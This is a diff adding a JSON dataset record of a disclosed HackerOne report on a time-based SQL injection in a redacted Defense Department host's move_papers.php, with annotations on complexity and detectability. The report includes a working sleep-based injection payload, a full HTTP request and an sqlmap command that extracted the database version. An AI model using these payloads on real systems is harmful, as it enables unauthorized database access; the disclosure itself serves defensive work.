@@ -1,0 +1,42 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "sp1d3rs ",
+  "title": "SQL Injection in the `move_papers.php` on the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nDescription\nHello. I was able to find another one Time-based SQLI on the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pubs/move_papers.php using pub_group_id parameter.\nThis is my third SQLi (and probably the last one) found on this host. I wasn't able to detect more, but due to the big number of high impact issues found I also recommend to do internal audit of this host to determine other potential issues I could skip. I have feeling that more endpoints can be affected by the sql injection, I just didn't find them all. I'll continue my research and will report other vulnerabilities if I find any.\nFor the start, by bruteforcing files in the /pubs/ directory, I came across this script:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pubs/move_papers.php\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI was able to determine the parameter pub_group_id (similar sqli through this parameter was found and reported earlier in other script - get_publications.php in #489483 )\nPOC\nCode 505 Bytes\n1GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Connection: keep-alive\n4Cache-Control: max-age=0\n5Upgrade-Insecure-Requests: 1\n6User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n8Accept-Encoding: gzip, deflate, br\n9Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\n10Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11\n12\nThis request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.\nAs additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:\nCode 95 Bytes\n1sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5\nwhere test.txt is a text file contained request dump:\n\u2588\u2588\u2588\u2588\nResult:\nCode 23 Bytes\n15.5.62-0ubuntu0.14.04.1\n\u2588\u2588\u2588\u2588\u2588\nNo sensitive data such as databases, tables, or content was accessed.\nImpact\nSQL injection usually have high or critical impact.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1593104820,
+  "report_url": "https://hackerone.com/reports/491191",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Identify the target URL: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pubs/move_papers.php"
+    ],
+    [
+      2,
+      "Send a crafted GET request with the malicious pub_group_id parameter: GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1"
+    ]
+  ],
+  "vuln_description": "Time-based SQL Injection vulnerability in the `move_papers.php` script via the `pub_group_id` parameter, allowing an attacker to execute arbitrary SQL commands and extract database information by observing response delays.",
+  "reason": "The vulnerability involves a straightforward SQL injection through a single parameter. The attack does not require multiple components, complex state manipulation, or novel logic. The tester used common techniques like parameter manipulation and time-based delays to confirm the vulnerability.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "489483",
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability reported involves a time-based SQL injection in the `pub_group_id` parameter of the `move_papers.php` script. This vulnerability is not related to authentication or authorization bypass but rather to improper input validation leading to SQL injection. The proposed methodologies focus on detecting AuthN/AuthZ bypasses and IDOR vulnerabilities by manipulating user sessions and resource IDs, which are not applicable to SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
